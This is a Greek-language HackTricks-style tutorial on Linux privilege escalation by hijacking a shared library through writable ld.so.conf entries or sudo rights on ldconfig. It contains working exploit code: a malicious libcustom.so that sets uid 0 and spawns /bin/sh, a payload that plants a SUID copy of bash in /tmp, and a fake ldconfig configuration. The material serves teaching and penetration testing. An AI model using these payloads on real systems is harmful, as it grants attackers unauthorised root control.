# ld.so privesc exploit παράδειγμα

{{#include ../../banners/hacktricks-training.md}}

## Προετοιμασία του περιβάλλοντος

Στην ακόλουθη ενότητα μπορείτε να βρείτε τον κώδικα των αρχείων που θα χρησιμοποιήσουμε για την προετοιμασία του περιβάλλοντος

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Δημιουργήστε** αυτά τα αρχεία στο machine σας, στον ίδιο φάκελο
2. **Κάντε compile τη** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Αντιγράψτε** το `libcustom.so` στο `/usr/lib` και ανανεώστε το cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Κάντε compile το** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Έλεγχος του environment

Ελέγξτε ότι το _libcustom.so_ **φορτώνεται** από το _/usr/lib_ και ότι μπορείτε να **εκτελέσετε** το binary.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Χρήσιμες εντολές triage

Κατά την επίθεση σε έναν πραγματικό στόχο, επαληθεύστε το **ακριβές όνομα της βιβλιοθήκης** που χρειάζεται το binary και τι **επιλύει αυτήν τη στιγμή** ο loader:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
Μερικές χρήσιμες παγίδες:

- Το `sudo echo ... > /etc/ld.so.conf.d/x.conf` συνήθως **δεν λειτουργεί**, επειδή
η ανακατεύθυνση εκτελείται από το τρέχον shell. Χρησιμοποιήστε αντ' αυτού:
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- Τα **SUID/privileged** binaries αγνοούν τα `LD_LIBRARY_PATH`/`LD_PRELOAD` σε
**secure-execution mode**, αλλά οι κατάλογοι που προέρχονται από το `/etc/ld.so.conf`
παραμένουν μέρος της trusted ρύθμισης του loader, επομένως αυτή η λανθασμένη
ρύθμιση μπορεί να επηρεάσει και privileged προγράμματα.<sup>[[1]](#references)</sup>
- Σε νεότερες εκδόσεις του glibc, ο dynamic loader παρέχει επίσης το
`--list-diagnostics`, το οποίο είναι χρήσιμο για debugging της επίλυσης του cache και
της επιλογής υποκαταλόγων `glibc-hwcaps`, όταν ένα hijack δεν συμπεριφέρεται όπως
αναμένεται.<sup>[[1]](#references)</sup>

## Exploit

Σε αυτό το σενάριο θα υποθέσουμε ότι **κάποιος έχει δημιουργήσει μια vulnerable entry** μέσα σε ένα αρχείο στο _/etc/ld.so.conf/_:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Ο ευάλωτος φάκελος είναι ο _/home/ubuntu/lib_ (όπου έχουμε δικαίωμα εγγραφής).\
**Κατεβάστε και μεταγλωττίστε** τον ακόλουθο κώδικα μέσα σε αυτήν τη διαδρομή:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Αν αναμένετε το **root** (ή κάποιον άλλο προνομιούχο λογαριασμό) να εκτελέσει αργότερα το ευάλωτο binary, συνήθως είναι προτιμότερο να αφήσετε ένα **artifact** που ανήκει στο **root**, αντί να εκκινήσετε ένα διαδραστικό **shell**. Για παράδειγμα:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Στη συνέχεια, αφού πραγματοποιηθεί η εκτέλεση με προνόμια, μπορείτε να χρησιμοποιήσετε το `/tmp/rootbash -p`.

Τώρα που έχουμε **δημιουργήσει την κακόβουλη βιβλιοθήκη libcustom μέσα στη μη σωστά ρυθμισμένη** διαδρομή, πρέπει να περιμένουμε ένα **reboot** ή να εκτελέσει ο χρήστης root το **`ldconfig`** (_σε περίπτωση που μπορείτε να εκτελέσετε αυτό το binary ως **sudo** ή διαθέτει το **suid bit**, θα μπορείτε να το εκτελέσετε μόνοι σας_).

Μόλις συμβεί αυτό, **ελέγξτε ξανά** από πού το εκτελέσιμο `sharedvuln` φορτώνει τη βιβλιοθήκη `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Όπως μπορείτε να δείτε, γίνεται **φόρτωση από το `/home/ubuntu/lib`** και αν οποιοσδήποτε χρήστης το εκτελέσει, θα εκτελεστεί ένα shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Σημειώστε ότι σε αυτό το παράδειγμα δεν έχουμε κάνει privilege escalation, αλλά τροποποιώντας τις εντολές που εκτελούνται και **περιμένοντας από τον root ή άλλον privileged χρήστη να εκτελέσει το ευάλωτο binary**, θα μπορέσουμε να κάνουμε privilege escalation.

### Άλλες λανθασμένες ρυθμίσεις - Ίδιο vuln

Στο προηγούμενο παράδειγμα προσομοιώσαμε μια λανθασμένη ρύθμιση, όπου ένας administrator **όρισε έναν non-privileged φάκελο μέσα σε ένα configuration file μέσα στο `/etc/ld.so.conf.d/`**.\
Ωστόσο, υπάρχουν και άλλες λανθασμένες ρυθμίσεις που μπορούν να προκαλέσουν την ίδια ευπάθεια: αν έχετε **write permissions** σε κάποιο **config file** μέσα στο `/etc/ld.so.conf.d`s, στον φάκελο `/etc/ld.so.conf.d` ή στο αρχείο `/etc/ld.so.conf`, μπορείτε να ρυθμίσετε την ίδια ευπάθεια και να την εκμεταλλευτείτε.

## Exploit 2

**Ας υποθέσουμε ότι έχετε sudo privileges για το `ldconfig`**.\
Μπορείτε να υποδείξετε στο `ldconfig` **από πού να φορτώσει τα conf files**, ώστε να το εκμεταλλευτούμε για να κάνουμε το `ldconfig` να φορτώσει arbitrary folders.<sup>[[2]](#references)</sup>\
Επομένως, ας δημιουργήσουμε τα files και τους folders που απαιτούνται για να φορτώσουμε το "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Τώρα, όπως υποδεικνύεται στο **προηγούμενο exploit**, **δημιουργήστε τη malicious library μέσα στο `/tmp`**.\
Και τέλος, ας φορτώσουμε το path και ας ελέγξουμε από πού φορτώνει το binary τη βιβλιοθήκη:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Όπως μπορείτε να δείτε, έχοντας sudo privileges για το `ldconfig`, μπορείτε να εκμεταλλευτείτε την ίδια ευπάθεια.**

## Αναφορές

- [1] [ld.so(8) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)

{{#include ../../banners/hacktricks-training.md}}
